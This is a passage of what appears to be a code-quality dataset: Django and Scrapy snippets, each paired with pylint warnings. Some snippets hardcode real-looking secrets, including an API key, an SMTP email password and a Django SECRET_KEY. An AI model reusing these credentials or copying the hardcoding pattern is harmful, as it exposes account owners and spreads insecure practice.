52           # 添加异常处理
53           query.addCallback(self.handle_error)  # 处理异常
54   
55       def do_insert(self, cursor, item):
56           # 对数据库进行插入操作，并不需要commit，twisted会自动commit
57           insert_sql = """"""
58         insert into pm_article(title, create_date, url, content, view, tag, url_id) VALUES (%s, %s, %s, %s, %s, %s, %s)
59         """"""
60           cursor.execute(insert_sql, (item['title'], item['create_date'], item['url'],
61                                       item['content'], item['view'], item['tag'], item['url_id']))
62   
63       def handle_error(self, failure):
64           if failure:
65               # 打印错误信息
66               print(failure)
67   
68   
69   class ElasticsearchPipeline(object):
70       # 将数据写入到es中
71       def process_item(self, item, spider):
72           # 将item转换为es的数据
73           item.save_to_es()
74   
75           return item
","21 - refactor: useless-object-inheritance
32 - refactor: use-dict-literal
45 - warning: unused-argument
69 - refactor: useless-object-inheritance
71 - warning: unused-argument
69 - refactor: too-few-public-methods
8 - warning: unused-import
"
"1   from django.urls import path
2   from .views import (
3       PostListView,
4       PostDetailView,
5       # PostCreateView,
6       # PostUpdateView,
7       # PostDeleteView,
8       # UserPostListView
9   )
10   from . import views
11   
12   from .feeds import  LatestPostsFeed
13   
14   urlpatterns = [
15       path('', views.home, name='home'),
16       path('blogs/', views.PostListView.as_view(), name='post_list'),
17       path('blog/<int:pk>/', PostDetailView.as_view(), name='post-detail'),
18       path('about/', views.about, name='about'),
19       path('<int:post_id>/share/',views.post_share, name='post_share'),
20       path('feed/', LatestPostsFeed(), name='post_feed'),
21       path('search/', views.post_search, name='post_search'),
22   
23       path('api/', views.post_api, name='post_api'),
24   
25       path('blog/', views.post_list, name='post_list'),
26       path('<int:year>/<slug:post>/',
27           views.post_detail,
28           name='post_detail'),
29       path('tag/<slug:tag_slug>/',
30           views.post_list, name='post_list_by_tag'),     
31   ]
","2 - error: relative-beyond-top-level
10 - error: no-name-in-module
12 - error: relative-beyond-top-level
2 - warning: unused-import
"
"1   # -*- coding: utf-8 -*-
2   import scrapy
3   
4   from properties.items import PropertiesItem
5   class BasicSpider(scrapy.Spider):
6       name = 'basic'
7       allowed_domains = ['web']
8       start_urls = (
9           # 'http://web:9312/properties/property_000000.html',
10           # 'https://www.coreapi.org/#examples',
11           # 'https://www.freecodecamp.org/news/git-ssh-how-to',
12           'https://djangopackages.org',
13       )
14       # start_urls = ['https://django-dynamic-scraper.readthedocs.io/en/latest/getting_started.html',]
15   
16       def parse(self, response):
17           l.add_xpath('title', '//*[@itemprop=""name""][1]/text()',
18                   MapCompose(unicode.strip, unicode.title))
19           l.add_xpath('price', './/*[@itemprop=""price""][1]/text()',
20                   MapCompose(lambda i: i.replace(',', ''), float),
21           re='[,.0-9]+')
22                   l.add_xpath('description', '//*[@itemprop=""description""]'
23           '[1]/text()', MapCompose(unicode.strip), Join())
24                   l.add_xpath('address',
25                   '//*[@itemtype=""http://schema.org/Place""][1]/text()',
26           MapCompose(unicode.strip))
27           l.add_xpath('image_urls', '//*[@itemprop=""image""][1]/@src',
28           MapCompose(
29            lambda i: urlparse.urljoin(response.url, i)))
30   
31           # l.add_xpath('title', '//*[@itemprop=""name""][1]/text()')
32           # l.add_xpath('price', './/*[@itemprop=""price""]'
33           # '[1]/text()', re='[,.0-9]+')
34           # l.add_xpath('description', '//*[@itemprop=""description""]'
35           # '[1]/text()')
36           # l.add_xpath('address', '//*[@itemtype='
37           # '""http://schema.org/Place""][1]/text()')
38           # l.add_xpath('image_urls', '//*[@itemprop=""image""][1]/@src')
39           return l.load_item()
40   
41   
42   
43   
44           # item = PropertiesItem()
45           # item['title'] = response.xpath(
46           # '//*[@id=""myrotatingnav""]/div/div[1]').extract()
47           # # item['price'] = response.xpath(
48           # # '//*[@itemprop=""price""][1]/text()').re('[.0-9]+')
49           # item['description'] = response.xpath(
50           # '//*[@id=""myrotatingnav""]/div/div[1]/a[1]').extract()
51           # # item['address'] = response.xpath(
52           # # '//*[@itemtype=""http://schema.org/'
53           # # 'Place""][1]/text()').extract()
54           # # item['image_urls'] = response.xpath(
55           # # '//*[@itemprop=""image""][1]/@src').extract()
56           # return item
57   
58   
59   
60   
61           # self.log(""title: %s"" % response.xpath(
62           #     '//*[@itemprop=""name""][1]/text()').extract())
63           # self.log(""price: %s"" % response.xpath(
64           #     '//*[@itemprop=""price""][1]/text()').re('[.0-9]+'))
65           # self.log(""description: %s"" % response.xpath(
66           #     '//*[@itemprop=""description""][1]/text()').extract())
67           # self.log(""address: %s"" % response.xpath(
68           #     '//*[@itemtype=""http://schema.org/'
69           #     'Place""][1]/text()').extract())
70           # self.log(""image_urls: %s"" % response.xpath(
71           #     '//*[@itemprop=""image""][1]/@src').extract())
72                       
","22 - error: syntax-error
"
"1   # -*- coding: utf-8 -*-
2   # Generated by Django 1.11.29 on 2021-02-24 08:54
3   from __future__ import unicode_literals
4   
5   from django.db import migrations, models
6   import open_news.models
7   
8   
9   class Migration(migrations.Migration):
10   
11       dependencies = [
12           ('open_news', '0001_initial'),
13       ]
14   
15       operations = [
16           migrations.CreateModel(
17               name='Document',
18               fields=[
19                   ('id', models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),
20                   ('file', models.FileField(upload_to=open_news.models.upload_location)),
21               ],
22           ),
23       ]
","9 - refactor: too-few-public-methods
"
"1   # -*- coding: utf-8 -*-
2   #定义需要抓取存进数据库的字段
3   from scrapy.item import Item,Field
4   class TcZufangItem(Item):
5       #帖子名称
6       title=Field()
7       #租金
8       money=Field()
9       #租赁方式
10       method=Field()
11       #所在区域
12       area=Field()
13       #所在小区
14       community=Field()
15       #帖子详情url
16       targeturl=Field()
17       #帖子发布时间
18       pub_time=Field()
19       #所在城市
20       city=Field()
21       # 联系电话
22       phone= Field()
23       # 图片1
24       img1 = Field()
25       # 图片2
26       img2 = Field()
27   
28   
29   
","4 - refactor: too-few-public-methods
"
"1   import requests
2   import json
3   
4   url='https://www.scraping-bot.io/rawHtmlPage.html'
5   username = 'yourUsername'
6   apiKey = 'yourApiKey'
7   
8   apiUrl = ""http://api.scraping-bot.io/scrape/raw-html""
9   
10   payload = json.dumps({""url"":url})
11   headers = {
12       'Content-Type': ""application/json""
13   }
14   
15   response = requests.request(""POST"", apiUrl, data=payload, auth=(username,apiKey), headers=headers)
16   
17   print(response.text)
18   
19   
20   
21   import requests
22   import json
23   
24   url='https://www.scraping-bot.io/rawHtmlPage.html'
25   username = 'yourUsername'
26   apiKey = 'yourApiKey'
27   
28   apiEndPoint = ""http://api.scraping-bot.io/scrape/raw-html""
29   
30   options = {
31       ""useChrome"": False,#set to True if you want to use headless chrome for javascript rendering
32       ""premiumProxy"": False, # set to True if you want to use premium proxies Unblock Amazon,Google,Rakuten
33       ""proxyCountry"": None, # allows you to choose a country proxy (example: proxyCountry:""FR"")
34       ""waitForNetworkRequests"":False # wait for most ajax requests to finish until returning the Html content (this option can only be used if useChrome is set to true),
35                                      # this can slowdown or fail your scraping if some requests are never ending only use if really needed to get some price loaded asynchronously for example
36   }
37   
38   payload = json.dumps({""url"":url,""options"":options})
39   headers = {
40       'Content-Type': ""application/json""
41   }
42   
43   response = requests.request(""POST"", apiEndPoint, data=payload, auth=(username,apiKey), headers=headers)
44   
45   print(response.text)
46   
47    https://libraries.io/api/NPM/base62?api_key=306cf1684a42e4be5ec0a1c60362c2ef 
48   import requests
49   import json
50   
51   url='https://www.scraping-bot.io/example-ebay.html'
52   username = 'yourUsername'
53   apiKey = '306cf1684a42e4be5ec0a1c60362c2ef'
54   
55   apiEndPoint = ""http://api.scraping-bot.io/scrape/retail""
56   
57   payload = json.dumps({""url"":url,""options"":options})
58   headers = {
59       'Content-Type': ""application/json""
60   }
61   
62   response = requests.request(""POST"", apiEndPoint, data=payload, auth=(username,apiKey), headers=headers)
63   
64   print(response.text)","47 - error: syntax-error
"
"1   # -*- coding: utf-8 -*-
2   from django.shortcuts import render
3   from . models import ItemInfo
4   from django.core.paginator import Paginator
5   from mongoengine import connect
6   connect(""zufang_fs"",host='127.0.0.1')
7   # Create your views here.
8   def document(request):
9       limit=15
10       zufang_info=ItemInfo.objects
11       pageinator=Paginator(zufang_info,limit)
12       page=request.GET.get('page',1)
13       loaded = pageinator.page(page)
14       cities=zufang_info.distinct(""city"")
15       citycount=len(cities)
16       context={
17           'itemInfo':loaded,
18           'counts':zufang_info.count,
19           'cities':cities,
20           'citycount':citycount
21       }
22       return render(request,'document.html',context)
23   def binzhuantu():
24       ##饼状图
25       citys = []
26       zufang_info = ItemInfo.objects
27       sums = float(zufang_info.count())
28       cities = zufang_info.distinct(""city"")
29       for city in cities:
30           length = float(len(zufang_info(city=city)))
31           ocu = round(float(length / sums * 100))
32           item = [city.encode('raw_unicode_escape'), ocu]
33           citys.append(item)
34       return citys
35   
36   def chart(request):
37       ##饼状图
38       citys=binzhuantu()
39       # #柱状图
40       # zufang_info = ItemInfo.objects
41       # res = zufang_info.all()
42       # cities = zufang_info.distinct(""city"")
43       # cc = []
44       # time = []
45       # counts = []
46       # for re in res:
47       #     if re.pub_time != None:
48       #         if re.pub_time > '2017-03-01':
49       #             if re.pub_time < '2017-04-01':
50       #                 time.append(re.city)
51       # for city in cities:
52       #     count = time.count(city)
53       #     counts.append(count)
54       #     item = city.encode('utf8')
55       #     cc.append(item)
56       context ={
57           # 'count': counts,
58           # 'citys': cc,
59           'cities':citys,
60       }
61       return render(request,'chart.html',context)
62   def cloud(request):
63       zufang_info = ItemInfo.objects
64       res = zufang_info.distinct('community')
65       length=len(res)
66       context={
67           'count':length,
68           'wenzi':res
69       }
70       return render(request, 'test.html',context)
71   
72   def test(request):
73       zufang_info = ItemInfo.objects
74       rr=[]
75       res = zufang_info.distinct('community')
76       i=0
77       while i<500:
78           item=res[i]
79           rr.append(item)
80           i=i+1
81       length = len(res)
82       context = {
83           'count': length,
84           'wenzi':  rr
85       }
86       return render(request,'test.html',context)","3 - error: relative-beyond-top-level
"
"1   # -*- coding: utf-8 -*-
2   from scrapy_redis.spiders import RedisSpider
3   from scrapy.selector import Selector
4   class testSpider(RedisSpider):
5       name = 'testip'
6       redis_key = 'testip'
7       def parse(self,response):
8           response_selector = Selector(response)
9           code=response_selector.xpath(r'//div[contains(@class,""well"")]/p[1]/code/text()')
10           print code
11   
","10 - error: syntax-error
"
"1   from django.urls import path,include
2   from blog  import views
3   
4   
5   urlpatterns = [
6       # path('', views.index, name='base'),
7       path('', views.list, name='list'),
8   
9       # path('home/', views.home, name='home'),
10       # path('search/', views.Search, name='home_search'),
11   
12       # path('', views.home, name='home'),
13       ]
","1 - warning: unused-import
"
"1   
2   import os
3   from django.urls import reverse_lazy
4   
5   # Build paths inside the project like this: os.path.join(BASE_DIR, ...)
6   BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
7   
8   
9   SECRET_KEY = 'vsfygxju9)=k8qxmc9!__ng%dooyn-w7il_z+w)grvkz4ks!)u'
10   
11   # SECURITY WARNING: don't run with debug turned on in production!
12   DEBUG = True
13   
14   ALLOWED_HOSTS = []
15   
16   
17   # Application definition
18   
19   INSTALLED_APPS = [
20       ""django.contrib.humanize.apps.HumanizeConfig"",
21       ""django.contrib.auth.apps.AuthConfig"",
22       ""django.contrib.contenttypes.apps.ContentTypesConfig"",
23       ""django.contrib.sessions.apps.SessionsConfig"",
24       ""django.contrib.sites.apps.SitesConfig"",
25       ""django.contrib.messages.apps.MessagesConfig"",
26       ""django.contrib.staticfiles.apps.StaticFilesConfig"",
27       ""django.contrib.admin.apps.AdminConfig"",
28       ""django.contrib.admindocs.apps.AdminDocsConfig"",
29       ""sekizai"",
30       ""sorl.thumbnail"",
31       ""django_nyt.apps.DjangoNytConfig"",
32       ""wiki.apps.WikiConfig"",
33       ""wiki.plugins.macros.apps.MacrosConfig"",
34       ""wiki.plugins.help.apps.HelpConfig"",
35       ""wiki.plugins.links.apps.LinksConfig"",
36       ""wiki.plugins.images.apps.ImagesConfig"",
37       ""wiki.plugins.attachments.apps.AttachmentsConfig"",
38       ""wiki.plugins.notifications.apps.NotificationsConfig"",
39       ""wiki.plugins.editsection.apps.EditSectionConfig"",
40       ""wiki.plugins.globalhistory.apps.GlobalHistoryConfig"",
41       ""mptt"",
42   ]
43   
44   
45   MIDDLEWARE = [
46       ""django.contrib.sessions.middleware.SessionMiddleware"",
47       ""django.middleware.common.CommonMiddleware"",
48       ""django.middleware.csrf.CsrfViewMiddleware"",
49       ""django.contrib.auth.middleware.AuthenticationMiddleware"",
50       ""django.contrib.messages.middleware.MessageMiddleware"",
51       ""django.middleware.clickjacking.XFrameOptionsMiddleware"",
52       ""django.middleware.security.SecurityMiddleware"",
53   ]
54   SITE_ID=1
55   
56   ROOT_URLCONF = 'wikidj.urls'
57   
58   TEMPLATES = [
59       {
60           ""BACKEND"": ""django.template.backends.django.DjangoTemplates"",
61           ""DIRS"": [
62               os.path.join(BASE_DIR, ""templates""),
63           ],
64           ""APP_DIRS"": True,
65           ""OPTIONS"": {
66               ""context_processors"": [
67                   ""django.contrib.auth.context_processors.auth"",
68                   ""django.template.context_processors.debug"",
69                   ""django.template.context_processors.i18n"",
70                   ""django.template.context_processors.request"",
71                   ""django.template.context_processors.tz"",
72                   ""django.contrib.messages.context_processors.messages"",
73                   ""sekizai.context_processors.sekizai"",
74               ],
75               ""debug"": DEBUG,
76           },
77       },
78   ]
79   WSGI_APPLICATION = 'wikidj.wsgi.application'
80   
81   
82   # Database
83   # https://docs.djangoproject.com/en/2.2/ref/settings/#databases
84   
85   DATABASES = {
86       'default': {
87           'ENGINE': 'django.db.backends.sqlite3',
88           'NAME': os.path.join(BASE_DIR, 'db.sqlite3'),
89       }
90   }
91   
92   
93   # Password validation
94   # https://docs.djangoproject.com/en/2.2/ref/settings/#auth-password-validators
95   
96   AUTH_PASSWORD_VALIDATORS = [
97       {
98           'NAME': 'django.contrib.auth.password_validation.UserAttributeSimilarityValidator',
99       },
100       {
101           'NAME': 'django.contrib.auth.password_validation.MinimumLengthValidator',
102       },
103       {
104           'NAME': 'django.contrib.auth.password_validation.CommonPasswordValidator',
105       },
106       {
107           'NAME': 'django.contrib.auth.password_validation.NumericPasswordValidator',
108       },
109   ]
110   
111   
112   # Internationalization
113   # https://docs.djangoproject.com/en/2.2/topics/i18n/
114   
115   LANGUAGE_CODE = 'en-us'
116   
117   TIME_ZONE = 'UTC'
118   
119   USE_I18N = True
120   
121   USE_L10N = True
122   
123   USE_TZ = True
124   
125   
126   # Static files (CSS, JavaScript, Images)
127   # https://docs.djangoproject.com/en/2.2/howto/static-files/
128   
129   STATIC_URL = ""/static/""
130   STATIC_ROOT = os.path.join(BASE_DIR, ""static"")
131   MEDIA_ROOT = os.path.join(BASE_DIR, ""media"")
132   MEDIA_URL = ""/media/""
133   
134   
135   WIKI_ANONYMOUS_WRITE = True
136   WIKI_ANONYMOUS_CREATE = False
137   LOGIN_REDIRECT_URL = reverse_lazy('wiki:get', kwargs={'path': ''})
138   
139   
140   
141   # urlpatterns += static(settings.MEDIA_URL, document_root=settings.MEDIA_ROOT)","Clean Code: No Issues Detected
"
"1   
2   from django import template
3   from django.db.models import Q
4   from django.conf import settings
5   from django.template.defaultfilters import stringfilter
6   from django.utils.safestring import mark_safe
7   import random
8   from django.urls import reverse
9   # from blog.models import Article, Category, Tag, Links, SideBar, LinkShowType
10   from django.utils.encoding import force_text
11   from django.shortcuts import get_object_or_404
12   import hashlib
13   import urllib
14   # from comments.models import Comment
15   from DjangoBlog.utils import cache_decorator, cache
16   from django.contrib.auth import get_user_model
17   from oauth.models import OAuthUser
18   from DjangoBlog.utils import get_current_site
19   import logging
20   
21   
22   
23   logger = logging.getLogger(__name__)
24   
25   register = template.Library()
26   
27   
28   @register.simple_tag
29   def timeformat(data):
30       try:
31           return data.strftime(settings.TIME_FORMAT)
32           # print(data.strftime(settings.TIME_FORMAT))
33           # return ""ddd""
34       except Exception as e:
35           logger.error(e)
36           return """"
37   
38   
39   @register.simple_tag
40   def datetimeformat(data):
41       try:
42           return data.strftime(settings.DATE_TIME_FORMAT)
43       except Exception as e:
44           logger.error(e)
45           return """"        
46   
47   
48   
49   @register.filter(is_safe=True)
50   @stringfilter
51   def custom_markdown(content):
52       from DjangoBlog.utils import CommonMarkdown
53       return mark_safe(CommonMarkdown.get_markdown(content))
","34 - warning: broad-exception-caught
43 - warning: broad-exception-caught
3 - warning: unused-import
7 - warning: unused-import
8 - warning: unused-import
10 - warning: unused-import
11 - warning: unused-import
12 - warning: unused-import
13 - warning: unused-import
15 - warning: unused-import
15 - warning: unused-import
16 - warning: unused-import
17 - warning: unused-import
18 - warning: unused-import
"
"1   # from core.models import Item
2   from django.shortcuts import render
3   # from django.views.generic import  ListView,DetailView
4   from django.shortcuts import render, get_object_or_404
5   from django.core.paginator import Paginator, EmptyPage, PageNotAnInteger
6   from .models import Post
7   from django.views.generic import (
8       ListView,
9       DetailView,
10       # CreateView,
11       # UpdateView,
12       # DeleteView
13   )
14   from django.core.mail import send_mail
15   from .forms import EmailPostForm
16   
17   from core.models import  Comment
18   from .forms import EmailPostForm, CommentForm , SearchForm
19   from taggit.models import Tag
20   from django.db.models import Count
21   from django.contrib.postgres.search import SearchVector  #Building a search view veter
22   
23   
24   
25   def  post_search(request):
26       form= SearchForm()
27       query=None
28       results=[]
29       if 'query' in request.GET:
30           form=SearchForm(request.GET)
31           if form.is_valid():
32               query=form.cleaned_data['query']
33               results=Post.published.annotate(
34                   search =SearchVector('title','body'),
35                   ).filter(search=query)
36       return render(request,'search.html',{
37           'form':form,
38           'query':query,
39           'results':results
40       })            
41   
42   
43   
44   
45   
46   
47   
48   
49   
50   def post_share(request, post_id):
51       # Retrieve post by id
52       post = get_object_or_404(Post, id=post_id, status='published')
53       sent = False
54       if request.method == 'POST':
55   
56           # Form was submitted
57           form = EmailPostForm(request.POST)
58           if form.is_valid():
59               # Form fields passed validation
60               cd = form.cleaned_data
61           # ... send email
62           post_url = request.build_absolute_uri(
63               post.get_absolute_url())
64           subject = f""{cd['name']} recommends you read ""f""{post.title}""
65           message = f""Read {post.title} at {post_url}\n\n"" f""{cd['name']}\'s comments: {cd['comments']}""
66           send_mail(subject, message, 'rp9545416@gmail.com',[cd['to']])
67           sent = True     
68   
69       else:
70           form=EmailPostForm()
71           return render(request, 'share.html', {'post': post,
72                                               'form': form,
73                                               'sent': sent})
74   
75   
76   class PostDetailView(DetailView):
77       model = Post
78   class PostListView(ListView):
79       queryset=Post.published.all()
80       context_object_name='posts'
81       paginate_by=2
82       template_name='list.html'
83   
84   
85   def post_list(request , tag_slug=None):
86       object_list=Post.published.all()
87       tag=None
88   
89       if tag_slug:
90           tag=get_object_or_404(Tag,slug=tag_slug)
91           object_list=object_list.filter(tags__in=[tag])
92       paginator=Paginator(object_list, 2)  # 3 posts in each page
93       page=request.GET.get('page')
94       try:
95           posts=paginator.page(page)
96       except PageNotAnInteger:
97           # If page is not an integer deliver the first page
98           posts=paginator.page(1)
99       except EmptyPage:
100           # If page is out of range deliver last page of results
101           posts=paginator.page(paginator.num_pages)
102   
103       return render(request,
104                     'list.html',
105                     {'posts': posts,
106                      'page': page,
107                      'tag': tag})
108   
109   
110   def post_detail(request, year, month, day, post):
111       post=get_object_or_404(Post, slug = post,
112                                status = 'published',
113                                publish__year = year,
114                                publish__month = month,
115                                publish__day = day)
116     
117       comments=post.comments.filter(active=True)
118       new_comment=None
119       
120       # List of similar posts
121       post_tags_ids = post.tags.values_list('id', flat=True)
122       similar_posts = Post.published.filter(tags__in=post_tags_ids).exclude(id=post.id)
123       similar_posts=similar_posts.annotate(same_tags=Count('tags')).order_by('-same_tags','-publish')[:4]
124   
125       if request.method== 'POST':
126           #comment aas passed
127           comment_form=CommentForm(data=request.POST)
128           if  comment_form.is_valid():
129               #new coment object 
130               new_comment=comment_form.save(comment=False)
131   
132               new_comment.post
133               new_comment.save()
134           else:
135               comment_form=CommentForm()    
136   
137        
138       return render(request,
139                     'blog/post_detail.html',
140                     {'post': post,
141                     'comments': comments,
142                     'new_comment': new_comment,
143                     'comment_form': comment_form,
144                     'similar_posts': similar_posts})
145                     
146   
147   def home(request):
148      
149       return render(request, 'base.html')
150   
151   
152   def about(request):
153       return render(request, 'about.html')
154   
155   # def product(request):
156   #     return render (request ,'product.html' )
157   
158   # class ItemdDetailView(DetailView):
159   #     model=Item
160   #     template_name=""product.html""
161   
162   
163   # def checkout(request):
164   #     return render (request ,'checkout.html')
","4 - warning: reimported
6 - error: relative-beyond-top-level
15 - error: relative-beyond-top-level
18 - error: relative-beyond-top-level
18 - warning: reimported
64 - error: possibly-used-before-assignment
50 - refactor: inconsistent-return-statements
76 - refactor: too-few-public-methods
78 - refactor: too-few-public-methods
132 - warning: pointless-statement
17 - warning: unused-import
"
"1   from django.db import models
2   from tinymce.models import HTMLField
3   from django.utils import timezone
4   from django.contrib.auth.models import User
5   from django.urls import reverse
6   
7   
8   class Post(models.Model):
9       title = models.CharField(max_length=100)
10       content = models.TextField()
11       description =HTMLField()
12   
13       date_posted = models.DateTimeField(default=timezone.now)
14       author = models.ForeignKey(User, on_delete=models.CASCADE)
15   
16       def __str__(self):
17           return self.title
18   
19       def get_absolute_url(self):
20           return reverse('post-detail', kwargs={'pk': self.pk})
21   
22   
23   
24   
25   
26   
27   
28   
29   class feeds(models.Model):
30       title = models.CharField(max_length=100)
31       overview = models.TextField(max_length=20)
32       timestamp = models.DateTimeField(auto_now_add=True)
33       description =HTMLField()
34   
35       thumbnail = models.ImageField()
36       featured = models.BooleanField()
37       # content = HTMLField()
38   
39   
40   
41       def __str__(self):
42           return self.title
43   
44   class Products(models.Model):
45   	title       =models.CharField(max_length=100)
46   	description =models.TextField(blank=True)
47   	price       =models.DecimalField(decimal_places=2,max_digits=1000)
48   	summary     =models.TextField(blank=False, null=False)
49       # featured    =models.BooleanField()
50   
51   
52   
53   
54   class MyModel(models.Model):
55       ...
56       content = HTMLField()","45 - warning: bad-indentation
46 - warning: bad-indentation
47 - warning: bad-indentation
48 - warning: bad-indentation
29 - refactor: too-few-public-methods
44 - refactor: too-few-public-methods
55 - warning: unnecessary-ellipsis
54 - refactor: too-few-public-methods
"
"1   from django.http import response
2   from django.shortcuts import render
3   from .forms import  DocumentForm
4   import requests
5   
6   from django.shortcuts import render
7   from django.conf import settings
8   from django.core.files.storage import FileSystemStorage
9   
10   def simple_upload(request):
11       if request.method == 'POST':
12           myfile = DocumentForm(request.POST, request.FILES)
13   
14   
15           myfile = request.FILES['file']
16   
17           fs = FileSystemStorage()
18   
19           filename = fs.save(myfile.name, myfile)
20           uploaded_file_url = fs.url(filename)
21   
22           return render(request, 'imple_upload.html', {
23               'uploaded_file_url': uploaded_file_url
24           })
25       return render(request, 'simple_upload.html')
26   
27   def model_form_upload(request):
28       if request.method == 'POST':
29           form = DocumentForm(request.POST, request.FILES)
30           if form.is_valid():
31               form.save()
32               return redirect('home')
33       else:
34           form = DocumentForm()
35       return render(request, 'core/model_form_upload.html', {
36           'form': form
37       })
38   
39   
40   def api(request):
41      
42      api_key ='306cf1684a42e4be5ec0a1c60362c2ef'
43      name='npm'
44   
45      api_url=""https://libraries.io/api/search?q={}&api_key={}"".format(name ,api_key)
46      response=requests.get(api_url)
47      response_dict = response.json()
48   
49      return render(request, 'api.html',{'api': response_dict, }  
50      
51      
52       )
53   
54   
55   
56   
57   
58   
59   
60   
61   
62   
63      # return render(request,'search.html',{
64   #         'url':url,
65   #         # 'query':query,
66   #         # 'results':results
67   #     })   
68   
69   
","42 - warning: bad-indentation
43 - warning: bad-indentation
45 - warning: bad-indentation
46 - warning: bad-indentation
47 - warning: bad-indentation
49 - warning: bad-indentation
3 - error: relative-beyond-top-level
6 - warning: reimported
32 - error: undefined-variable
46 - warning: redefined-outer-name
46 - warning: missing-timeout
1 - warning: unused-import
7 - warning: unused-import
"
"1   # -*- coding: utf-8 -*-
2   import smtplib
3   from email.mime.text import MIMEText
4   from email.header import Header
5   def sendMessage_warning():
6       server = smtplib.SMTP('smtp.163.com', 25)
7       server.login('seven_2016@163.com', 'ssy102009')
8       msg = MIMEText('爬虫slave被封警告！请求解封！', 'plain', 'utf-8')
9       msg['From'] = 'seven_2016@163.com <seven_2016@163.com>'
10       msg['Subject'] = Header(u'爬虫被封禁警告！', 'utf8').encode()
11       msg['To'] = u'seven <751401459@qq.com>'
12       server.sendmail('seven_2016@163.com', ['751401459@qq.com'], msg.as_string())
","10 - warning: redundant-u-string-prefix
11 - warning: redundant-u-string-prefix
"
"1   #Stage 2 Update (Python 3)
2   from __future__ import unicode_literals
3   from django.utils.encoding import python_2_unicode_compatible
4   from django.db import models
5   from django.db.models.signals import pre_delete
6   from django.dispatch import receiver
7   from scrapy_djangoitem import DjangoItem
8   from dynamic_scraper.models import Scraper, SchedulerRuntime
9   
10   
11   @python_2_unicode_compatible
12   class NewsWebsite(models.Model):
13       name = models.CharField(max_length=200)
14       url = models.URLField()
15       scraper = models.ForeignKey(Scraper, blank=True, null=True, on_delete=models.SET_NULL)
16       scraper_runtime = models.ForeignKey(SchedulerRuntime, blank=True, null=True, on_delete=models.SET_NULL)
17       
18       def __str__(self):
19           return self.name
20   
21   
22   @python_2_unicode_compatible
23   class Article(models.Model):
24       title = models.CharField(max_length=200)
25       news_website = models.ForeignKey(NewsWebsite) 
26       description = models.TextField(blank=True)
27       url = models.URLField(blank=True)
28       thumbnail = models.CharField(max_length=200, blank=True)
29       checker_runtime = models.ForeignKey(SchedulerRuntime, blank=True, null=True, on_delete=models.SET_NULL)
30       
31       def __str__(self):
32           return self.title
33   
34   
35   class ArticleItem(DjangoItem):
36       django_model = Article
37   
38   
39   @receiver(pre_delete)
40   def pre_delete_handler(sender, instance, using, **kwargs):
41       if isinstance(instance, NewsWebsite):
42           if instance.scraper_runtime:
43               instance.scraper_runtime.delete()
44       
45       if isinstance(instance, Article):
46           if instance.checker_runtime:
47               instance.checker_runtime.delete()
48               
49   pre_delete.connect(pre_delete_handler)
50   
51   
52   def upload_location(instance, filename):
53       return '%s/documents/%s' % (instance.user.username, filename)
54   
55   class Document(models.Model):
56       # user = models.ForeignKey(settings.AUTH_USER_MODEL)
57       # category = models.ForeignKey(Category, on_delete=models.CASCADE)
58       file = models.FileField(upload_to=upload_location)
59   
60       def __str__(self):
61           return self.filename()
62   
63       def filename(self):
64           return os.path.basename(self.file.name)","12 - refactor: too-few-public-methods
23 - refactor: too-few-public-methods
35 - refactor: too-few-public-methods
40 - warning: unused-argument
40 - warning: unused-argument
40 - warning: unused-argument
64 - error: undefined-variable
"
"1   from django.contrib.sitemaps import Sitemap
2   from  . models import Post
3   
4   
5   
6   class PostSitemap(Sitemap):
7       changefreq='weekly'  # You create a custom sitemap by inheriting the Sitemap class of the sitemaps
8       priority = 0.9       # module. The changefreq and priority attributes indicate the change frequency
9         # of your post pages and their relevance in your website (the maximum value is 1 ).
10   
11   
12       def items(self):
13           return Post.published.all()
14   
15   
16       def lastmod(self,obj):
17           return obj.updated    
18       
","2 - error: relative-beyond-top-level
"
"1   # Define here the models for your scraped items
2   #
3   # See documentation in:
4   # https://docs.scrapy.org/en/latest/topics/items.html
5   
6   import scrapy
7   from scrapy.item import Item,Field
8   
9   
10   class PropertiesItem():
11   
12       title=Field()
13       price=Field()
14       description=Field()
15       address = Field()
16       image_urls = Field()
17   
18       #imagescalculaitons
19       images = Field()
20       locations = Field()
21       #housekeeping
22       url=Field()
23       project = Field()
24       spider=Field()
25       server = Field()
26       date=Field()
27   
","10 - refactor: too-few-public-methods
6 - warning: unused-import
7 - warning: unused-import
"
"1   # -*- coding: utf-8 -*-
2   
3   
4   import redis
5   redis_cli = redis.StrictRedis()
6   redis_cli.incr(""pm_count"")
7   
","Clean Code: No Issues Detected
"
"1   
2   from .settings import *
3   from .dev import * 
4   # Test codehilite with pygments
5   
6   WIKI_MARKDOWN_KWARGS = {
7       ""extensions"": [
8           ""codehilite"",
9           ""footnotes"",
10           ""attr_list"",
11           ""headerid"",
12           ""extra"",
13       ]
14   }","2 - error: relative-beyond-top-level
2 - warning: wildcard-import
3 - error: relative-beyond-top-level
3 - warning: wildcard-import
"
"1   # -*- coding: utf-8 -*-
2   """"""
3   -------------------------------------------------
4      File Name：     util
5      Description :
6      Author :        JHao
7      date：          2020/9/30
8   -------------------------------------------------
9      Change Activity:
10                      2020/9/30:
11   -------------------------------------------------
12   """"""
13   __author__ = 'JHao'
14   
15   from math import ceil
16   
17   
18   class PageInfo(object):
19   
20       def __init__(self, page, total, limit=8):
21           """"""
22   
23           :param page: 页数
24           :param total: 总条数
25           :param limit: 每页条数
26           """"""
27           self._limit = limit
28           self._total = total
29           self._page = page
30           self._index_start = (int(page) - 1) * int(limit)
31           self._index_end = int(page) * int(limit)
32   
33       @property
34       def index_start(self):
35           return self._index_start
36   
37       @property
38       def index_end(self):
39           return self._index_end
40   
41       @property
42       def current_page(self):
43           return self._page
44   
45       @property
46       def total_page(self):
47           return ceil(self._total / self._limit)
48   
49       @property
50       def total_number(self):
51           return self._total
","18 - refactor: useless-object-inheritance
"
"1   import scrapy
2   
3   def authentication_failed(response):
4       pass
5   
6   
7   
8   class LoginSpider(scrapy.Spider):
9       name='ex'
10       start_urls=['https://www.facebook.com/login.php']
11   
12       def parse(self,response):
13           return scrapy.FormRequest.from_response(
14               response,formdata={'username':'john','password':'secret'},
15               callback=self.after_login
16           )
17   
18       def after_login(self,response):
19           if authentication_failed(response):
20               self.logger.error('Login Failed')
21               return    
22   
23   
24   
25           
26   
27           page = response.url.split(""/"")[-2]
28           filename = f'quotes-{page}.html'
29           with open(filename, 'wb') as f:
30               f.write(response.body)    ","3 - warning: unused-argument
"
"1   # -*- coding: utf-8 -*-
2   from __future__ import unicode_literals
3   
4   from django.db import migrations, models
5   
6   
